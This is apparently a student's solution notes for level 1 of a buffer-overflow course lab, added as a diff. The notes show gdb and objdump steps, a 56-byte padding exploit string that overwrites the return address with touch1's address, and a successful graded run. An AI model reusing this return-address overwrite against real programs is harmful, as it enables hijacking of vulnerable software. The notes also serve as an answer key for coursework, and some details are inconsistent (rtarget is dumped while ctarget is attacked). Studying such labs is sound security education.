@@ -1,0 +1,54 @@
+// Beware! avoid using comments in the attack code! if you forget a space before or after the "/*" the comment will be treated as part of the buffer!
+
+u2 israele4 18 : cd SP2/target8888
+u2 israele4 21 : gdb ctarget
+
+(gdb) b getbuf
+Breakpoint 1 at 0x4016af: file buf.c, line 12.
+
+//check how much padding needed:
+
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x00000000004016af <+0>:     sub    $0x38,%rsp
+   0x00000000004016b3 <+4>:     mov    %rsp,%rdi
+   0x00000000004016b6 <+7>:     callq  0x4018e7 <Gets>
+   0x00000000004016bb <+12>:    mov    $0x1,%eax
+   0x00000000004016c0 <+17>:    add    $0x38,%rsp
+   0x00000000004016c4 <+21>:    retq
+End of assembler dump.
+(gdb) quit
+
+//we need 0x38 bytes of padding.
+
+u2 israele4 22 : objdump -d rtarget > rtarget_dump.txt
+
+//open above file and search for touch1 address.
+//it is 0x4016c5
+//convert to little endian - 0xc51640
+
+
+u2 israele4 23 : cat > phase1sol.txt
+^C
+
+//edit phase1sol file- 
+00 00 00 00 00 00 00 00 /* pad with 0x38 bytes = 56 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c5 16 40 00 00 00 00 00 /* touch1 address(little endian) */
+
+
+//covert solution to raw for attack injection
+u2 israele4 25 : ./hex2raw < phase1sol.txt > phase1raw.txt
+
+//attack!
+u2 israele4 26 : ./ctarget < phase1raw.txt
+Cookie: 0x4f3ff3d1
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
